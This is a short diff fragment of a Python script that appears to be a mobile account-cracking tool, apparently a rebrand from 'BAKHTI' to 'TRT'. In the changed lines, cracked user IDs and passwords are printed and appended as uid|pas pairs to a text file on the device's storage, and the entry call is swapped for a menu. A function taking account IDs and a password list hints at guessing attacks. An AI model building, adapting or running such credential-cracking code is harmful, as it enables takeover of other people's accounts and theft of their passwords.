-					print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/BAKHTI-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [TRT-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/TRT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
@@ -1715,7 +1596,7 @@ def lina6(ids,passlist):
 	except:
 		pass
 try:
-	main_apv()
+	menu()
 except requests.exceptions.ConnectionError:
 	print('\n No internet connection ...')
 	exit()
